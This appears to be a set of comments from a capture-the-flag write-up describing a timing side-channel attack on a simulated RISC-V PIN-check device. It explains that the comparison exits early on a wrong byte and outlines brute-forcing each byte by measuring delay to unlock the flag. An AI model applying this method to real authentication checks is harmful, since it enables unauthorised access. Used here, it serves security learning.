# Program execution:
# - can pass in 16 bytes for a pin
# - can flip a switch to check if pin is correct
# - enables reading flag memory if correct
# - cannot read flag memory or pin memory directly otherwise

# Vulnerability:
# - on pin check request being received, there is a 255 cycle delay before the bytes of the given pin and correct pin are compared
# - check exits right away if a different byte is encountered, and device_status is changed to idle on exit
# - an incorrect byte results in ~6 loop cycles to resolve, while a correct byte takes at least 6 (6 for itself and then it will check the next byte)
# - the differing amount of time it takes to complete a check relative to the number of correct bytes means we can perform a timing attack


# Exploit:
# - we can use device_status as an oracle to tell us when checking is completed, and a for loop to tell how much time was spent checking
# - write into start area a stager that writes anything received over main() while a loop stalls the program
# - write into main a program that loops through every possibility for the next byte in pins until a higher delay is encountered, then saves that byte and iterates to the next 1
# - eventually all pins are found and we can read the flag
# To build payload can use provided source files and modify them for RISCV code
# lots of possible errors due to alignment problems and RISC using PC relative or absolute addresses in various instructions
# Adding debug statements using the LPT helped, since program setup makes it hard to view internals (everything runs through verilator)
